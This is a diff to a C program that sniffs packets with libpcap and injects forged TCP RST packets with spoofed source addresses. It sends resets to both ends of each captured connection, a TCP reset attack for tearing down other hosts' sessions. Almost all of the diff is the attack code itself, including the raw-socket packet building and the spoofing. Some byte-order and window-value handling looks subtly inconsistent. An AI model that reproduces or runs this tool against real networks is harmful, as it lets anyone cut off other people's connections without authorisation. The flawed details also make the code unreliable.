@@ -4,7 +4,8 @@
 #include<netinet/ip.h>
 #include<netinet/tcp.h>
 #include<string.h>
-#include<sys/socket.h>
+#include<arpa/inet.h>
+#include<unistd.h>   
 
 #define _USE_BSD // TO use the BSD IP header
 #define _FAVOR_BSD // TO use the BSD TCP header
@@ -48,12 +49,12 @@ unsigned short in_cksum(unsigned short *addr,int len){
     return(answer);
 }
 
-int tcp_send_rest(u_int32 seq, u_int32 src_ip, u_int32 dest_ip, u_int32 src_port, u_int32 dest_port){
+int tcp_send_reset(u_int32_t seq, u_int32_t src_ip, u_int32_t dest_ip, u_int32_t src_port, u_int32_t dest_port){
     
     int rawsocket = 0;
     int one = 1;
     
-    char packet[sizeof(struct tcphdr) + sizeof(struct ip) + 1];
+    char packet[sizeof(struct ip) + sizeof(struct tcphdr)];
 
      struct ip *ipheader = (struct ip*)packet;
      struct tcphdr *tcpheader = (struct tcphdr*)(packet + sizeof(struct ip));
@@ -65,19 +66,73 @@ int tcp_send_rest(u_int32 seq, u_int32 src_ip, u_int32 dest_ip, u_int32 src_port
 
      memset(&pseudohdr, 0, sizeof(tcp_pseudohdr));
      memset(&dstaddress, 0, sizeof(dstaddress));
-     memset(&packet, 0, sizeof(tcp_packet));
+     memset(&packet, 0, sizeof(packet));
 
      dstaddress.sin_family = AF_INET;
-     dstaddress.sin_port = dest_port;
-     dstaddress.sin_addr.s = dest_ip;
+     dstaddress.sin_port = 0;
+     dstaddress.sin_addr.s_addr = dest_ip;
 
      rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
-     /*
+        if(rawsocket < 0){
+            printf("Tcp_send_reset(): Socket error\n");
+            exit(rawsocket);
+        }
 
-     TO BE CONTINUE START EXACTLY AT 3:34 or before this ..
+        if(setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
+            printf("Tcp_send_reset(): setsockopt error\n");
+            exit(-1);
+        }
 
-     */
+        ipheader->ip_hl = 5; //Header length in octal number
+        ipheader->ip_v = 4; //AF_INET ipv4
+        ipheader->ip_tos = 0; //TYPE of service 
+        ipheader->ip_len = htons(sizeof(struct tcphdr) + sizeof(struct ip));
+        ipheader->ip_off = 0; // Fragment offset
+        ipheader->ip_ttl = 64; // time to live 
+        ipheader->ip_p = 6; //tcp = 6, udp = 17
+        ipheader->ip_sum = 0;
+        ipheader->ip_id = htons(1234); //just any number
+        ipheader->ip_src.s_addr = src_ip;
+        ipheader->ip_dst.s_addr = dest_ip;
+
+        tcpheader->th_seq = seq;
+        tcpheader->th_ack = htonl(1);
+        tcpheader->th_off = 5; //IP header length
+        tcpheader->th_flags = TH_RST; // we are setting the RST flag
+        tcpheader->th_win = htons(1234) + rand() % 1000; //under 9999
+        tcpheader->th_urp = 0; // urgent pointer, just leave it as zero
+        tcpheader->th_sport = src_port;
+        tcpheader->th_dport = dest_port;
+        tcpheader->th_sum = 0;
+
+        pseudohdr.src = src_ip;
+        pseudohdr.dst = dest_ip;
+        pseudohdr.zero = 0;
+        pseudohdr.protocol = 6;
+        pseudohdr.len = htons(sizeof(struct tcphdr)); 
+
+        memcpy(&tcpcsumblock, &pseudohdr, sizeof(tcp_pseudohdr));
+        memcpy(tcpcsumblock+sizeof(tcp_pseudohdr), tcpheader, sizeof(struct tcphdr));
+
+        tcpheader->th_sum = in_cksum((unsigned short*)(tcpcsumblock), sizeof(tcpcsumblock));
+        ipheader->ip_sum = in_cksum((unsigned short*)ipheader, sizeof(struct ip));
+
+        if(sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddress, sizeof(dstaddress)) < 0){
+            printf("tcp_send_rest():send_to: Cannot send RST\n");
+            return -1;
+        }
+
+        printf("Sent RST packet: \n");
+        printf("\tSRC:PORT %s:%d\n",inet_ntoa(ipheader->ip_src), ntohs(tcpheader->th_sport));
+        printf("\tDEST:PORT %s:%d\n",inet_ntoa(ipheader->ip_dst), ntohs(tcpheader->th_dport));
+        printf("\tSEQ %u\n",ntohl(tcpheader->th_seq));
+        printf("\tACK %u\n",ntohl(tcpheader->th_ack));
+
+        close(rawsocket);
+
+        return 0;
+
 }
 
 /*
@@ -109,7 +164,7 @@ int main(int argc, char *argv[]){
         printf("%s\n",error);
         exit(-1);
     }else{
-        printf("Listening on %s.......\n", device);
+        printf("Listening on %s.......\n", argv[1]);
     }
 
     if(pcap_compile(desc, &fp, fillter_expression, 0, netmask) == -1){
@@ -130,20 +185,30 @@ int main(int argc, char *argv[]){
         }else{
             iphdr = (struct ip*)(packet + 14);
             tcphdr = (struct tcphdr*)(packet + 14 + 20);
-            if(count = 0){
+            if (1){ 
                 printf("-----------------------------------------------------------\n");
                 printf("Recevied packet #%d:\n",++count);
                 printf("\tACK: %u\n",ntohl(tcphdr->th_ack));
                 printf("\tSEQ: %u\n",ntohl(tcphdr->th_seq));
                 printf("\tDEST IP: %s\n",inet_ntoa(iphdr->ip_dst));
                 printf("\tSRC IP: %s\n",inet_ntoa(iphdr->ip_src));
-                printf("\tDEST PORT: %s\n",ntohs(tcphdr->th_sport));
-                printf("\tSRC PORT: %s\n",ntohs(tcphdr->th_dport));
+                printf("\tDEST PORT: %d\n",ntohs(tcphdr->th_sport));
+                printf("\tSRC PORT: %d\n",ntohs(tcphdr->th_dport));
 
-                tcp_send_reset(tcphdr->th_ack, iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr,
-                    tcphdr->th_dport, tcphdr->th_sport);
-                
+                tcp_send_reset(tcphdr->th_ack, 
+                                iphdr->ip_dst.s_addr, 
+                                iphdr->ip_src.s_addr,
+                                tcphdr->th_dport, 
+                                tcphdr->th_sport);
+                    
+                tcp_send_reset(ntohl(tcphdr->th_ack)+1, 
+                                        iphdr->ip_src.s_addr, 
+                                        iphdr->ip_dst.s_addr,
+                                        tcphdr->th_sport, 
+                                        tcphdr->th_dport);
             }
         }
     }
+    pcap_close(desc);
+    return 0;
 }
